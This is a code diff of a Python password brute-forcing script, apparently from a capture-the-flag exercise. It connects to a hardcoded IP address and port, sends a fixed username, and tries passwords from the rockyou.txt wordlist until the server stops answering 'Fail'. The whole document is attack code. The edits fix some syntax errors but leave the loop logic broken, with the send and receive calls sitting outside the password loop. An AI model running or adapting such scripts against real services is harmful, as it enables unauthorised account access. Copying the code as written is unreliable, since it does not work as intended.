@@ -24,39 +24,41 @@
 
 """
 
+
 import socket
 
-host = "142.93.136.81" 
+host = "142.93.136.81"
 port = 1337
-wordlist ="rockyou.txt" # Point to wordlist file
+wordlist = "rockyou.txt"
 
 def brute_force():
+
     file = open(wordlist,"r")
     username = "v0idcache"
 
-          for password in file:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
 
-          
-                
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-           
+    for password in file:
 
- 
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect( (host,port) )
 
-                s.send(username+"\n")   # Send a newline \n at the end of your command
-                data = s.recv(1024)
-     
-    s.send(password+"\n")
+    print("Bruteforce Username:"+username+"\t Password:"+ password)
+    data = s.recv(1024)
+
+    s.send(username +"\n")
+    data = s.recv(1024)
+
+    s.send(password +"\n")
     result = s.recv(1024)
     print("Result:"+result);
 
+    if result != "Fail\n":
+        print("Password Found:"+password)
+        return
 
-if result != "Fail\n:
-    print("Password Found:"+password)
-    break
+
 
 if __name__ == '__main__':
-    print("Starting: "+host+"Port:" str(port)+"\n)
+    print("Starting  Attack: "+host+" Port:"+str(port)+"\n")
     brute_force()
+
